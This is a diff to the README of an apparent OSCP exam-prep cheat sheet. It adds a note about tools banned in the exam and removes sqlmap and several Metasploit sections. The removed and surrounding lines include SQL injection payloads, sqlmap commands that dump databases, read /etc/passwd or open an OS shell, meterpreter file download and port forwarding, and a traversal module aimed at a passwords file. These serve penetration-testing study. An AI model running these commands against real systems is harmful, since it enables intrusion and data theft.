@@ -6,6 +6,12 @@
 
 Commands, Payloads and Resources for the Offensive Security Certified Professional Certification.
 
+DISCLAIMER: A guy on Twitter got a point. Automatic exploitation tools like `sqlmap` are prohibited to use in the exam. The same goes for the automatic exploitation functionality of `LinPEAS`. I am not keeping track of current guidelines related to those tools. For that i want to point out that i am not responsible if anybody uses a tool without double checking the latest exam restrictions and fails the exam. Inform yourself before taking the exam!
+
+I removed `sqlmap` because of the reasons above but `Metasploit` is still part of the guide because you can use it for one specific module. Thank you `Muztahidul Tanim` for making me aware and to `yeep` for the resources.
+
+Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#exam-restrictions) and the discussion about [LinPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/?hss_channel=tw-134994790). I hope this helps.
+
 ## Table of Contents
 
 - [Basics](https://github.com/0xsyr0/OSCP#basics)
@@ -59,7 +65,6 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 	- [Database Analysis](https://github.com/0xsyr0/OSCP#database-analysis)
 		- [Basic Commands](https://github.com/0xsyr0/OSCP#basic-commands)
 		- [SQL Injection](https://github.com/0xsyr0/OSCP#sql-injection)
-		- [sqlmap](https://github.com/0xsyr0/OSCP#sqlmap)
 		- [sqsh](https://github.com/0xsyr0/OSCP#sqsh)
 		- [SQL Truncation Attack](https://github.com/0xsyr0/OSCP#sql-truncation-attack)
 		- [xpath Injection](https://github.com/0xsyr0/OSCP#xpath-injection)
@@ -1293,26 +1298,6 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
 
-#### sqlmap
-
-```c
---batch         # don't ask any questions
---current-db    # dumps database
-
-sqlmap --list-tampers
-
-sqlmap -r <FILE>.reg -p id
-sqlmap -r <FILE>.reg -p id --dump
-sqlmap -r <FILE>.reg --level 5 --risk 3 --threads 10
-sqlmap -r <FILE>.reg --level 5 --risk 3 --tables
-sqlmap -r <FILE>.reg --level 5 --risk 3 --tables users --dump --threads 10
-sqlmap -r <FILE>.reg -p id --passwords
-sqlmap -r <FILE>.reg -p id --read-file+/etc/passwd
-sqlmap -R <FILE>.reg -p id --os-cmd=whoami
-sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq"
-sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq" --os-shell
-```
-
 #### sqsh
 
 ```c
@@ -1451,6 +1436,12 @@ meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    // port forwardi
 proxychains -q msfconsole
 ```
 
+##### Auxiliary Output Directory
+
+```c
+/home/kali/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
+```
+
 ##### Meterpreter Listener
 
 ###### Generate Payload
@@ -1497,57 +1488,6 @@ C:\> .\<FILE>.exe
 
 ```c
 meterpreter > download *
-```
-
-##### Enumeration
-
-###### SNMP Scan
-
-```c
-msf6 > use auxiliary/scanner/snmp/snmp_login
-msf6 auxiliary(scanner/snmp/snmp_login) > set RHOSTS <RHOST>
-msf6 auxiliary(scanner/snmp/snmp_login) > run
-```
-
-###### SNMP Enum
-
-```c
-msf6 > use auxiliary/scanner/snmp/snmp_enum
-msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS <RHOST>
-msf6 auxiliary(scanner/snmp/snmp_enum) > run
-```
-
-###### Tomcat Enumeration
-
-```c
-msf6 > use auxiliary/scanner/http/tomcat_mgr_login
-msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS <RHOST>
-msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
-```
-
-###### Exploit Suggester
-
-```c
-msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
-msf6 post(multi/recon/local_exploit_suggester) > set session 1
-msf6 post(multi/recon/local_exploit_suggester) > run
-```
-
-##### Auxiliary Handling
-
-###### Auxiliary Setup
-
-```c
-msf6 > use auxiliary/scanner/http/tvt_nvms_traversal
-msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set RHOSTS <RHOST>
-msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set FILEPATH Users/Nathan/Desktop/Passwords.txt
-msf6 auxiliary(scanner/http/tvt_nvms_traversal) > run
-```
-
-###### Auxiliary Output Directory
-
-```c
-/home/kali/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
 ```
 
 #### ShellShock
